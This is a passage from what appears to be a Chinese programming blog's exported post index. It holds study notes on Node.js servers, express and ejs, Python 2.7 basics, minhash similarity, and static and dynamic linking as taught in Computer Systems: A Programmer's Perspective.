infile=fs.createReadStream(filename,&#123;flags:&#x27;r&#x27;&#125;); var filelength=0; var curlength=0; fs.stat(filename,function (error,stats)&#123; filelength=stats.size; &#125;); res.writeHeader(200,&#123;&#x27;Content-Type&#x27;:&#x27;video/mp4&#x27;&#125;); infile.on(&#x27;readable&#x27;,function ()&#123; var chunk; while(null!==(chunk=infile.read()))&#123; curlength+=chunk.length; res.write(chunk,&#x27;utf-8&#x27;,function (err)&#123; console.log(&quot;文件读取进度%d，文件大小:%d&quot;,curlength,filelength); if(curlength&gt;=filelength)&#123; res.end(); &#125; &#125;); &#125; &#125;);&#125;); 添加图片添加图片同理image/jpeg 网页自动跳转12345678var http=require(&#x27;http&#x27;);var server=http.createServer(function (request,response)&#123; response.writeHead(302,&#123;&#x27;Location&#x27;:&#x27;http://www.baidu.com&#x27;&#125;); response.end();&#125;).listen(52222,function ()&#123; console.log(&quot;服务器的地址····&quot;);&#125;); 其中的状态码： 1xx：处理中；2xx：成功；3xx：重定向；4xx：客户端错误；5xx：服务端错误 request请求request对象常用属性 属性名称 说明 method 返回客户端请求方法 url 返回客户端请求url headers 返回请求信息头 trailers 返回请求网络 通过浏览器输入url的方式，都是GET请求 POST请求123456789101112131415161718192021var http=require(&#x27;http&#x27;);var fs=require(&#x27;fs&#x27;);http.createServer(function (request,response)&#123; if(request.method==&#x27;GET&#x27;)&#123; //输入链接其实相当于一个get请求 读取index然后发送到主页 console.log(&quot;请求get&quot;); fs.readFile(&#x27;index.html&#x27;, function (error, data) &#123; response.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;); response.end(data); &#125;); &#125;else if(request.method==&#x27;POST&#x27;)&#123; //由于按钮的提交是post请求，对request请求添加一个监听 request.on(&#x27;data&#x27;,function (data)&#123; response.writeHead(200,&#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;); response.end(&#x27;&lt;h1&gt;&#x27;+data+&#x27;&lt;/h1&gt;&#x27;); &#125;); &#125;&#125;).listen(52222,function ()&#123; console.log(&quot;服务器监听地址http://127.0.0.1:52222&quot;);&#125;); 其中的POST请求后，拿到data，并且刷新response() web开发中的模板引擎ejs模块ejs模块中的渲染标识 标识 说明 &lt;%Code%&gt; 输入JavaScript &lt;%=Value%&gt; 输出数据，比如字符串和数字 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455index.ejs&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;style&gt; .info&#123; margin: 0 auto; width: 300px; border: solid blue 1px; color: blue; &#125; .info h3&#123; text-align: center; border-bottom: dashed blue 1px; &#125; .info p&#123; text-align: center; border-bottom: dashed blue 1px; &#125; .info div&#123; text-align: center; border-bottom: dashed blue 1px; &#125; .info table&#123; margin: 0 auto; text-align: center; border-bottom: dashed blue 1px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;section class=&quot;info&quot;&gt; &lt;h3&gt;&lt;%=No%&gt;饿了么外卖&lt;/h3&gt; &lt;h5&gt;下单时间&lt;%=ordertime%&gt;&lt;/h5&gt; &lt;h5&gt;送啥都快，越吃越衰&lt;/h5&gt; &lt;table&gt; &lt;th&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;数量&lt;/td&gt; &lt;td&gt;价格&lt;/td&gt; &lt;/th&gt; &lt;%orderPrice.forEach(function (item)&#123;%&gt; &lt;tr&gt; &lt;td&gt;&lt;%=item.menu%&gt;&lt;/td&gt; &lt;td&gt;&lt;%=item.orederNo%&gt;&lt;/td&gt; &lt;td&gt;&lt;%=item.price%&gt;&lt;/td&gt; &lt;/tr&gt; &lt;%&#125;)%&gt; &lt;/table&gt;&lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 其中的&lt;%=ordertime%&gt;在js文件进行赋值，然后orderPrice.forEach遍历该对象中所有的成员，然后进行赋值 123456789101112131415161718192021222324op.jsvar http=require(&#x27;http&#x27;);var fs=require(&#x27;fs&#x27;);var ejs=require(&#x27;ejs&#x27;);http.createServer(function (req,res)&#123; fs.readFile(&#x27;index.ejs&#x27;,&#x27;utf8&#x27;,function(err,data)&#123; res.writeHead(200,&#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;); res.end(ejs.render(data,&#123; No:&#x27;2333&#x27;, ordertime:&#x27;2021年3月8日10:29:57&#x27;, orderPrice:[&#123; menu:&quot;可乐&quot;, orderNo:233, price:20, &#125;,&#123; menu:&quot;黄焖鸡&quot;, orderNo:233, price:200, &#125;] &#125;)); &#125;);&#125;).listen(2333,function()&#123; console.log(&quot;启动服务器&quot;);&#125;); pug模块Node.js中的文件操作文件读取与写入 文件名称 说明 readFile(file,encoding,callback) 文件异步读取 readFileSync(file,encoding) 文件同步读取 writeFile(file,encoding,callback) 文件异步写入 writeFileSync(file,data,encoding) 文件同步写入 同步读取文件，方法名具有Sync后缀，不具有Sync后缀均为异步方法，同步方法立即返回操作结果，在使用同步方法执行的操作结束前， 不能执行后续代码， 异常处理同步操作在使用同步方法进行文件操作时，可使用try-catch语句进行异常处理 12345try&#123; ···&#125;catch(e)&#123; console.log(e);&#125; 异步操作使用异步方法进行文件操作时，使用if-else语句进行异常处理 1234567fs.writeFile(&#x27;...txt&#x27;,data,&#x27;utf-8&#x27;,function(error,data)&#123; if(error)&#123; console.log(error); &#125;else&#123; ··· &#125;&#125;); express模块通过express模块创建服务器使用express( )方法创建一个Web服务器，然后通过use( )方法，监听请求与响应事件 123456789var express = require(&#x27;express&#x27;);var app=express();app.use(function (req, res)&#123; res.writeHead(200,&#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;); res.end(&quot;&lt;h1&gt;hello,world&lt;/h1&gt;&quot;);&#125;).listen(2333,function()&#123; console.log(&quot;服务器启动&quot;);&#125;); express模块中的响应对象使用模块创建对象后，express模块提供了request对象和response对象来完成客户端的请求操作和服务端的响应操作 方法名称 说明 response.redirect([status,]path) 强制跳转到指定页面 response.send([body]) 根据参数类型，返回对应数据 response.json([body]) 返回json数据 response.jsonp 返回jsonp数据 send()方法中的参数 数据类型 说明 字符串 HTML 数组 JSON 对象 JSON 1234567891011121314var express = require(&#x27;express&#x27;);var app=express();app.use(function (req, res)&#123; var out=[]; for(var i=0;i&lt;5;i++)&#123; out.push(&#123; id:i, name:&quot;caixukun&quot;+i &#125;); &#125; res.send(out[1].id+out[1].name);&#125;).listen(2333,function()&#123; console.log(&quot;服务器启动&quot;);&#125;); express模块中的请求对象express模块也使用了request对象，封装了客户端请求的属性和方法 request对象中的属性和方法 属性 说明 params 返回路由参数 query 返回请求变量 headrs 返回请求头信息 header( ) 设置请求头信息 accepts(type) 判断请求accpet属性信息 is(type) 判断请求Content-Type属性信息 输出浏览器的请求头： 12345678var express = require(&#x27;express&#x27;);var app=express();app.use(function (req, res)&#123; var agent=req.headers; res.send(agent);&#125;).listen(2333,function()&#123; console.log(&quot;服务器启动&quot;);&#125;); express模块中的中间块use( )方法中的参数是function(request,response,next)&#123;&#125;形式其中next表示一个函数，这个函数就可以称做为中间件 123456789101112131415161718var express = require(&#x27;express&#x27;);var app=express();app.use(function (req, res,next)&#123; console.log(&quot;第一个use&quot;) next();&#125;);app.use(function (req, res,next)&#123; console.log(&quot;第二个use&quot;) next();&#125;);app.use(function (req, res,next)&#123; console.log(&quot;第三个use&quot;) next();&#125;);app.listen(2333,function()&#123; console.log(&quot;服务器启动&quot;);&#125;); express模块中常用的中间块 中间块名称 说明 router 处理页面间的路由 static 托管静态文件，如图片、css文件和JavaScript文件 morgan 日志组件 cookie parser 处理cookie请求与响应 bady parser 对POST请求进行解析 content-multiparty 文件上传中间块 fs模块判断是文件还是文件夹12345678910var fs=require(&#x27;fs&#x27;);fs.stat(&#x27;./tmp&#x27;,function(error,data)&#123; if(error)&#123; console.log(error); return; &#125; console.log(`是文件$&#123;data.isFile()&#125;`); console.log(`是文件夹$&#123;data.isDirectory()&#125;`);&#125;) 通过使用fs.stat( )方法，然后返回的data进行判断 创建目录fs.mkdir(路径，权限，回调函数(error)&#123;&#125;) 创建、写入文件12345678var fs=require(&#x27;fs&#x27;);fs.writeFile(&#x27;./tmp/hello.txt&#x27;,&quot;hello world&quot;,function(error)&#123; if(error)&#123; console.log(error); &#125;&#125;);","categories":[{"name":"NodeJs","slug":"NodeJs","permalink":"http://example.com/categories/NodeJs/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"Python CGI编程","slug":"Python/Python-CGI编程","date":"2021-03-06T08:23:43.000Z","updated":"2021-04-01T14:08:48.000Z","comments":true,"path":"2021/03/06/Python/Python-CGI编程/","link":"","permalink":"http://example.com/2021/03/06/Python/Python-CGI%E7%BC%96%E7%A8%8B/","excerpt":"","text":"1.CGI(Common Gateway Interface)：通用网关接口，它是一段程序，运行在服务器上如：HTTP 服务器，提供同客户端 HTML 页面的接口。","categories":[{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python2.7语法规范","slug":"Python/Python2.7语法规范","date":"2021-03-05T10:48:10.000Z","updated":"2021-04-01T14:08:40.000Z","comments":true,"path":"2021/03/05/Python/Python2.7语法规范/","link":"","permalink":"http://example.com/2021/03/05/Python/Python2.7%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/","excerpt":"","text":"1.标准数据类型Python有五个标准的数据类型： 1.Numbers（数字）Python支持四种不同的数字类型： int（有符号整型） long（长整型[也可以代表八进制和十六进制]） float（浮点型） complex（复数） 2.String（字符串）3.List（列表）列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（即嵌套）。列表中值的切割也可以用到变量 [头下标:尾下标] ，就可以截取相应的列表，从左到右索引默认 0 开始，从右到左索引默认 -1 开始，下标可以为空表示取到头或尾。 4.Tuple（元组）元组是另一个数据类型，类似于 List（列表）。元组用 () 标识。内部元素用逗号隔开。但是元组不能二次赋值，相当于只读列表。 1234567#!/usr/bin/python# -*- coding: UTF-8 -*- tuple = ( &#x27;nowcoder&#x27;, 786 , 2.23, &#x27;john&#x27;, 70.2 )list = [ &#x27;nowcoder&#x27;, 786 , 2.23, &#x27;john&#x27;, 70.2 ]tuple[2] = 1000 # 元组中是非法应用list[2] = 1000 # 列表中是合法应用 5.Dictionary（字典）字典(dictionary)是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象集合，字典是无序的对象集合。 两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。 字典用”{ }”标识。字典由索引(key)和它对应的值value组成。 123456789101112131415#!/usr/bin/python# -*- coding: UTF-8 -*- dict = &#123;&#125;dict[&#x27;one&#x27;] = &quot;This is one&quot;dict[2] = &quot;This is two&quot; tinydict = &#123;&#x27;name&#x27;: &#x27;john&#x27;,&#x27;code&#x27;:6734, &#x27;dept&#x27;: &#x27;sales&#x27;&#125; print dict[&#x27;one&#x27;] # 输出键为&#x27;one&#x27; 的值print dict[2] # 输出键为 2 的值print tinydict # 输出完整的字典print tinydict.keys() # 输出所有键print tinydict.values() # 输出所有值 输出结果： 6.Python数据类型转换 函数 描述 int(x,base) 将x转换为一个整数，base代表进制，如果不是缺省，则x为字符串 int(3.6) int(‘12’,16) long(x,base) 将x转换为一个长整数 float(x) 将x转换到一个浮点数 str(x) 将对象 x 转换为字符串 repr(x) 将对象 x 转换为表达式字符串 eval(str) 用来计算在字符串中的有效Python表达式,并返回一个对象 tuple(s) 将序列 s 转换为一个元组 list(s) 将序列 s 转换为一个列表 set(s) 转换为可变集合 dict(d) 创建一个字典。d 必须是一个序列 (key,value)元组。 frozenset(s) 转换为不可变集合 chr(x) 将一个整数转换为一个字符 unichr(x) 将一个整数转换为Unicode字符 ord(x) 将一个字符转换为它的整数值 hex(x) 将一个整数转换为一个十六进制字符串 oct(x) 将一个整数转换为一个八进制字符串 2.Python运算符1.算术运算符2.比较（关系）运算符 运算符 描述 实例 == 等于 - 比较对象是否相等 (a == b) 返回 False。 != 不等于 - 比较两个对象是否不相等 (a != b) 返回 true. &lt;&gt; 不等于 - 比较两个对象是否不相等 (a &lt;&gt; b) 返回 true。这个运算符类似 != 。 &gt; 大于 - 返回x是否大于y (a &gt; b) 返回 False。 &lt; 小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。 (a &lt; b) 返回 true。 &gt;= 大于等于 - 返回x是否大于等于y。 (a &gt;= b) 返回 False。 &lt;= 小于等于 - 返回x是否小于等于y。 (a &lt;= b) 返回 true。 3.赋值运算符 运算符 描述 实例 = 简单的赋值运算符 c = a + b 将 a + b 的运算结果赋值为 c += 加法赋值运算符 c += a 等效于 c = c + a -= 减法赋值运算符 c -= a 等效于 c = c - a *= 乘法赋值运算符 c *= a 等效于 c = c * a /= 除法赋值运算符 c /= a 等效于 c = c / a %= 取模赋值运算符 c %= a 等效于 c = c % a **= 幂赋值运算符 c **= a 等效于 c = c ** a //= 取整除赋值运算符 c //= a 等效于 c = c // a 4.逻辑运算符Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20: 运算符 逻辑表达式 描述 实例 and x and y 布尔”与” - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。 (a and b) 返回 20。 or x or y 布尔”或” - 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。 (a or b) 返回 10。 not not x 布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。 not(a and b) 返回 False 5.位运算符6.成员运算符7.身份运算符8.运算符优先级3.Python随机函数Python包含以下常用随机数函数： 函数 描述 choice(seq) 从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。 randrange (start,stop,step) 从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1，step为递增增量 random() 随机生成下一个实数，它在[0,1)范围内。 seed([x]) 改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。 shuffle(lst) 将序列的所有元素随机排序 uniform(x, y) 随机生成下一个实数，它在[x,y]范围内。 123456789# coding=utf-8import randoma=range(10)print aprint &quot;在a序列中随便挑选一个：&quot;+str(random.choice(a))print &quot;使用randrange函数：&quot;+str(random.randrange(100,1000,3))print &quot;随机生成一个数在0-1之间&quot;+str(random.random())random.shuffle(a)print &quot;打乱a的顺序&quot;+str(a) 4.Python循环控制语句12for iterating_var in sequence: statements(s) 使用内置函数 len() 和 range()，函数 len() 返回列表的长度，即元素的个数。 range返回一个序列的数。 123456789# coding=utf-8a=&quot;I LOVE YOU&quot;for tmp in a: print tmpfor index in range(len(a)):#len返回一个长度 range返回一个序列此例序列为[0:9] print str(index)+&quot; : &quot;+(a[index])for index in a[0:10]: print index 5.时间与日期1234567# coding=utf-8import timeprint &quot;标准格式化时间&quot;+time.asctime( time.localtime(time.time()) )print &quot;时间戳&quot;+str(time.time())print &quot;时间结构&quot;+str(time.localtime(time.time()))print &quot;根据格式格式化时间&quot;+time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time.localtime(time.time())) 其中time.time()拿到当前时间的时间戳，然后time.localtime()将时间戳转化为时间结构 运行结果： python中时间日期格式化符号： %y 两位数的年份表示（00-99） %Y 四位数的年份表示（000-9999） %m 月份（01-12） %d 月内中的一天（0-31） %H 24小时制小时数（0-23） %I 12小时制小时数（01-12） %M 分钟数（00=59） %S 秒（00-59） %a 本地简化星期名称 %A 本地完整星期名称 %b 本地简化的月份名称 %B 本地完整的月份名称 %c 本地相应的日期表示和时间表示 %j 年内的一天（001-366） %p 本地A.M.或P.M.的等价符 %U 一年中的星期数（00-53）星期天为星期的开始 %w 星期（0-6），星期天为星期的开始 %W 一年中的星期数（00-53）星期一为星期的开始 %x 本地相应的日期表示 %X 本地相应的时间表示 %Z 当前时区的名称 %% %号本身 6.正则表达式1.re.match函数尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功，match()就返回none。 re.match(pattern,string,flags=0) 2.re.search方法re.search扫描整个字符串并返回第一个成功的匹配 re.search(pattern,string,flags=0)","categories":[{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"数据结构-文档相似性","slug":"数据结构/数据结构-文档相似性","date":"2020-12-28T07:59:19.000Z","updated":"2021-04-01T14:12:22.000Z","comments":true,"path":"2020/12/28/数据结构/数据结构-文档相似性/","link":"","permalink":"http://example.com/2020/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%96%87%E6%A1%A3%E7%9B%B8%E4%BC%BC%E6%80%A7/","excerpt":"","text":"1.minhash1.基本原理 可以看到其中的S1={a,d} S2={c} S3={b,d,e} S4={a,c,d} 为了得到各个集合的最小哈希值，首先对矩阵进行随机行打乱，则某集合的最小哈希值等于打乱后这一列第一个值为1的行所在的行号，打乱后的0-1矩阵为 如果所示，h(S1)=2 h(S2)=4 h(S3)=0 h(S4)=2 现仅考虑集合S1和S2，那么这两列所在的行有下面3种类型： 1、S1和S2的值都为1，记为X 2、只有一个值为1，另一个值为0，记为Y 3、S1和S2的值都为0，记为Z ​ S1和S2交集的元素个数为x，并集的元素个数为x+y，所以sim(S1,S2) = Jaccard(S1,S2) = x/(x+y)。接下来计算h(S1)=h(S2)的概率，经过随机行打乱后，从上往下扫描，在碰到Y行之前碰到X行的概率为x/(x+y)，即h(S1)=h(S2)的概率为x/(x+y)。 2.用hash函数计算前面矩阵","categories":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"算法","slug":"数据结构/算法","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"深入理解计算机系统-链接","slug":"计算机系统/深入理解计算机系统-链接","date":"2020-12-21T06:01:57.000Z","updated":"2021-04-01T14:11:16.000Z","comments":true,"path":"2020/12/21/计算机系统/深入理解计算机系统-链接/","link":"","permalink":"http://example.com/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/","excerpt":"1.编译器驱动程序大多数编译系统提供编译器驱动程序，它代表用户在需要时调用语言预处理器、编译器、汇编器和链接器。 1.预处理将源程序main.c翻译成一个ASCII码的中间文件main.i 预处理命令：输出的文件是main.i 1cpp [other arguments] main.c main.i 2.编译将main.i翻译成一个ASCII汇编语言文件main.s 编译命令：输出的文件是main.s 1cc1 main.i -Og [other argunments] -o main.s 3.汇编将main.s翻译成一个可重定位目标文件 汇编命令：输出的文件是main.o，该文件是一个可重定位的目标文件 1as [other arguments] -o main.o main.s 4.链接链接命令：创造一个可执行目标文件 elf；main.o和sum.o文件是需要链接的重定位目标文件 1ld -o elf [system object files and args] main.o sum.o","text":"1.编译器驱动程序大多数编译系统提供编译器驱动程序，它代表用户在需要时调用语言预处理器、编译器、汇编器和链接器。 1.预处理将源程序main.c翻译成一个ASCII码的中间文件main.i 预处理命令：输出的文件是main.i 1cpp [other arguments] main.c main.i 2.编译将main.i翻译成一个ASCII汇编语言文件main.s 编译命令：输出的文件是main.s 1cc1 main.i -Og [other argunments] -o main.s 3.汇编将main.s翻译成一个可重定位目标文件 汇编命令：输出的文件是main.o，该文件是一个可重定位的目标文件 1as [other arguments] -o main.o main.s 4.链接链接命令：创造一个可执行目标文件 elf；main.o和sum.o文件是需要链接的重定位目标文件 1ld -o elf [system object files and args] main.o sum.o 2.静态链接输入可重定位目标文件由不同的代码和数据节组成，每一节都是一个连续的字节序列。指令在一节(.text)中，初始化了的全局变量(.data)在另一节中，而未初始化的变量(.bss)又在另外一节中 在链接过程链接器需要完成的任务：1.符号解析目标文件定义和引用符号，每个符号对应于一个函数、一个全局变量或一个静态变量(C语言中声明的static属性的变量)，符号解析的目的是将每个符号引用正好和一个符号定义关联起来 2.重定位编译器和汇编生成从地址0开始的代码和数据节。链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，它们指向这个内存位置。链接器使用汇编器产生重定位条目的详细指令，不加区别地执行这样的重定位。 3.目标文件、符号、符号表1.目标文件三种： 可重定位目标文件 包含二进制代码和数据 .o文件 可执行目标文件 共享目标文件 .so .dll文件 2.可重定位目标文件 .o文件结构 session ELF头 ELF头以一个16字节序列开始，该序列描述生成文件的系统字的大小和字节顺序；剩下的内容包含帮助链接器语法分析和解释目标文件的信息，包含了ELF头的大小、目标文件的类型(如可重定位、可执行或者可共享)、机器类型(64位)、节头部表的文件偏移，以及节头部表中条目的大小和数量。不同节的位置和大小是由节头部表描述的，其中目标文件中每个节都有一个固定大小的条目 .text 已编译程序的机器代码 .rodata 只读数据。比如printf语句中的格式串和开关语句的跳转表 .data 已初始化的全局和静态C变量。 .bss 未初始化的全局和静态C变量，以及所有被初始化成0的全局或静态变量。在目标文件中这个节不占据实际的空间，仅仅是一个占位符。目标文件格式区分已初始化和未初始化变量是为了空间效率：在目标文件中，未初始化变量不需要占据任何空间。在运行时，内存中分配这些变量，初始值为0； .symtab 符号表，存放程序中定义和引用函数和全局变量的信息。 .rel.text 一个.text文件节中位置的列表，当链接器把这个目标文件和其他文件组合时，需要修改这些位置，一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一房间，调用本地函数的指令则不需要修改 .rel.data 被模块引用或定义所有全局变量的重定位信息。一般而言，任何已初始化的全局变量，如果它的初始值是一个全部变量地址或者外部定义函数的地址，都需要链接器被修改。 .debug 调试符号表，其条目是程序定义的局部变量和类型定义，程序中定义和引用的全局变量，以及初始的C源文件。编译加-g才能得到这张表 .line 原始C源程序中的行号和.text节中机器指令之间的映射。编译加-g才能得到这张表 .strtab 一个字符串表，其内容包含.symtab和.debug节中的符号表，以及节头部中的节名字。字符串表就是以null结尾的字符串序列。 节头部表 3.符号每个可重定位目标模块m都有一个符号表，它包含m定义和引用符号的信息，在链接器的上下文，有三种不同的符号。 链接符号： 全局符号：某一个模块定义、且可以被其他模块引用的变量或者函数符号(全局非静态函数或者变量) 外部符号：某个模块引用的由其他模块定义的全局符号(extern) 局部符号：由某个模块定义且仅有该模块引用的符号(静态的函数或者变量) 本地链接器符号和本地程序变量是不同的。.symtab中的符号表不包含对应于本地非静态程序变量的任何符号。定义为带有C~static属性的本地过程变量是不在栈中管理的，编译器在.data或.bss中为每个定义分配空间，并在符号表中创建一个有唯一名字的本地链接器符号。static属性隐藏模块内部的变量和函数声明，任何带有static属性声明的全局变量或者函数都是模块私有的 4.符号表符号表是由汇编器构造的，使用编译器输出到汇编语言.s文件中的符号。.symtab节中包含ELF符号表，这张符号表包含一个条目的数组 以下是每个条目的格式 123456789typedef struct&#123; int name;//name是字符串表中的字节偏移，指向符号的以null结尾的字符串名字。 char type:4 //数据或者函数。符号表还可以包含各个节的条目，以及对应原始源文件的路径名的条目，所以这些目标类型也有所不同。 binding:4;//binding字段表示符号是本地还是全局的。 char reserved; short section;//每个符号都被分配到目标文件的某个节，由section字段表示，该字段也是一个到节头部表的索引。 long value;//value是符号的地址。对于可重定位的模块来说，value是距目标的节的其实位置的偏移。对于可执行文件来说，该值是一个绝对运行时的地址。 long size;//size是目标的大小(以字节为单位)。&#125;Elf64_Symbol 关于section字段：该字段也是一个到节头部表的索引。 有三个特殊的伪节，其在节头部表中是没有条目的：ABS代表不该被重定位的符号；UNDEF代表未定义的符号，也就是在本目标模块中引用，但是在其他地方定义的符号；COMMON表示还未被分配位置的未初始化的数据目标。 对于COMMON符号，value字段给出对齐要求，而size给出最小的大小。只有可重定位目标文件中才有这些伪节，可执行文件中是没有的。 4.符号解析链接器解析符号引用的方法是将每个引用于它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。编译器只允许每个模块中每个局部符号有一个定义，静态局部变量也会有本地链接器的符号，编译器还要确保它们拥有唯一的名字。 1.链接器解析多重定义的全局符号链接器输入是一组可重定位目标模块、在编译时，编译器向汇编器输出每个全局符号，强或弱，而汇编器把这个信息隐含地编码在可重定位目标文件的符号表里。函数和已初始化的全局变量是强符号，未初始化的全局变量是弱符号。 以下三个规则： 不允许有多个同名的强符号 如果有一个强符号和多个弱符号同名，选择强符号 如果有多个弱符号同名，那么这些符号任意选择一个 2.与静态库链接所有相关的目标模块打包成一个单独的文件，称为静态库，它可以用做链接器的输入。当链接器构造一个输出的可执行文件时，它只复制静态库里的被应用程序引用的目标模块。相关的函数可以被编译成为独立的目标模块，然后封装成一个单独的静态库文件。然后，应用程序可以通过在命令行上指定单独的文件名字来使用这些在库中定义的函数。 在LINUX系统中，静态库以一种称为存档(archive)的特殊文件格式存放在磁盘中，存档文件是一组连接起来的可重定位目标文件的集合，有一个头部用来描述每个成员目标文件的大小和位置。存档文件名由后缀.a标识。 a.c文件 12345int addcnt=0;void all_add(int *x, int *y)&#123; *x=*x+1; *y=*y+1;&#125; b.c文件 123456int subcnt=0;void all_sub(int *x,int *y)&#123; *x=*x-1; *y=*y-1;&#125; main.c文件 123456#include&lt;stdio.h&gt;int x[2]=&#123;1,2&#125;;int main()&#123; all_add(&amp;x[0],&amp;x[1]); printf(&quot;x:%d,y:%d&quot;,x[0],x[1]);&#125; 1gcc -c a.c b.c -c参数生成可重定位的目标文件，未被链接，上面指令生成的是a.o以及b.o 1ar rcs all.a a.o b.o 由.o文件创建静态库all.a文件 1gcc -static -o main main.c all.a -static使编译器，构造一个完全链接可执行目标文件，可以独立载入内存运行，加载时无需更进一步的链接。 链接器运行时，由于判定了main.c中只引用了a.o中的符号，所以只复制了a.o到可执行文件，因为程序不引用任何由b.o定义的符号，所以链接器不会复制这个模块到可执行文件。 5.重定位链接器完成了符号解析这一步，把代码中每个符号引用和正好一个符号定义(即它一个输入目标模块中的一个符号表条目)关联起来，此时，链接器就知道它的输入目标模块的代码节和数据节的确切大小，即下一步进行重定位操作。 在这个重定位步骤中，将合并输入模块，并为每个符号分配运行时的地址，重定位一共两步： 1.重定位节和符号定义链接器将所有输入模块相同类型的节合并成同一类型的新的聚合节(如各个模块的.data节被全部合并成一个节，这个节成为输出可执行目标文件的.data节)。接下来，链接器重新将新的内存地址赋值给这些新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块定义的每个地址。该重定位节和符号定义的作用是：程序中的每条指令和全局变量都有唯一的运行时的内存地址。 2.重定位节总的符号引用链接器修改代码节和数据节中对每个符号的引用，使得运行指向正确的地址。主要依赖的是重定位条目的数据结构。 代码的重定位条目放在.rel.text中；已初始化数据的重定条目放在.rel.data中 重定位条目 123456typedef struct&#123; long offset; //offset是需要被修改的引用的节偏移 long type:32; //symbol标识 被修改引用应该指向的符号 symbol:32; //type告知链接器如何修改新的引用 long addend; //有符号常数，一些重定位要使用它对被修改引用的值做偏移调整&#125;Elf64_Rela; 两种基本的重定位类型： R_X86_64_PC32：重定位一个使用32位PC相对地址的引用。将PC或者IP中指令中的编码32位值加上PC的当前运行的值，得到有效地址(如函数的运行地址)，PC中值通常是下一条指令在内存中的地址。 R_X86_64_32：重定位一个使用32位PC绝对地址引用。通过绝对寻址，CPU直接使用在指令中编码32位值作为有效地址。 链接器重定位算法 1234567891011121314foreach section s&#123; foreach relocation entry r&#123; refptr= s + r.offset //计算出在当前节需要更新值的地址 if(r.type==R_X86_64_PC32)&#123; refaddr=ADDR(s)+r.offset //引用运行时的地址 *refptr=(unsigned)(ADDR(r.symbol)+r.append-refaddr) //更新引用 &#125; if(r.type==R_x86_64_32)&#123; *refptr=(unsigned)(ADDR(r.symbol)+r.addend); &#125; &#125; &#125; 假设下面的相对重定位条目 12e: e8 “00” 00 00 00 callq 13&lt;main+0x13&gt; f:R_X86_64_PC32 sum-0x4 可以由上表读出其中offset=0xf、type=R_X86_64_PC32、symbol=sum、addend=-4 假设该代码段节的地址为s=0x4004d0，ADDR(symbol)=0x4004e8那么其实refaddr=0x4004d0+0xf=0x4004df就到了上面代码段加双引用号的位置，最后更新这个地方的值*refptr=0x4004e8+(-4)-0x4004df得到函数的偏移量为0x5，更新值 124004de: e8 “05” 00 00 00 callq 4004e8&lt;sum&gt;4004e3 将要运行该指令时，由于PC寄存器指向的是下条指令，将PC寄存器中的值0x4004e3加上该值0x5就是函数的入口的地址40004e8；e8是call命令 绝对重定位条目 129: bf &quot;00&quot; 00 00 00 mov $0x0,%edi a:R_X86_64_32 array 可以由上表读出其中offse=0xf、type=R_X86_64_32、symbol=array、addend=0那么此时的ADDR(symbol)已经确定，直接将该值赋值给*refptr=ADDR(S)+offset，也就是双引号的开始的位置 6.可执行目标文件 7.动态链接共享库1.生成和使用共享库共享库是一个目标模块，在运行和加载时，可以记载任意的内存地址，并和一个内存中的程序链接起来。这个过程称为动态链接，是由一个动态链接器的程序来执行。共享库也称为共享目标，在LINUX系统中通常用.so后缀表示，在windows使用.dll文件表示。 共享库首先在任何系统中只有一个.so文件，所有引用该库的可执行目标文件共享这个，.so文件中的代码和数据，不是像静态库的内容那样被赋值和嵌入到引用他们的执行文件；在内存中，一个共享库的.text节的一个副本可以被不同的正在运行的进程共享。 1gcc -shared -fpic -o math.so add.c sub.c 其中-fpic选项指示编译器生成与位置无关的代码，-shared选项指示链接器创建一个共享的目标文件 1gcc -o main main.c ./math.so 